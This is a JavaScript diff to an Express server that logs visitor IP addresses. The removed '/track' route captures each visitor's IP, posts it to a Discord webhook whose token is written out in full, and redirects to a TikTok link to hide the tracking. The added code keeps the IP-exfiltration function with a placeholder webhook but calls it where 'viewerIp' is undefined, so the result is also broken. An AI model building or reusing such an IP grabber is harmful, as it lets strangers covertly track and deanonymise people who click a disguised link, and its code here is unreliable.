@@ -21,14 +21,24 @@ async function sendToDiscord(webhookUrl, content) {
 
 
 
-app.get('/track', (req, res) => {
-    const viewerIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+async function sendCapturedIp(webhookUrl, viewerIp) {
+    const response = await fetch(webhookUrl, {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            content: `Captured IP: ${viewerIp}`
+        })
+    });
 
-    sendToDiscord(
-        "https://discord.com/api/webhooks/1541943235667169310/7Ajw5PGih26r0ZVH3I4VOSQeEUg0fDYuIXXydo4FuI2FEZrNJdFX6aH4iePAzgRK6Doa",
-        `Captured IP: ${viewerIp}`
-    ).catch(console.error);
+    if (!response.ok) {
+        throw new Error(`Webhook request failed: ${response.status}`);
+    }
+}
 
-    // Redirect the user to a normal website
-    res.redirect('https://www.tiktok.com/t/ZTA6h7Rft/');
-});
+
+sendCapturedIp(
+    "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN",
+    viewerIp
+).catch(console.error);
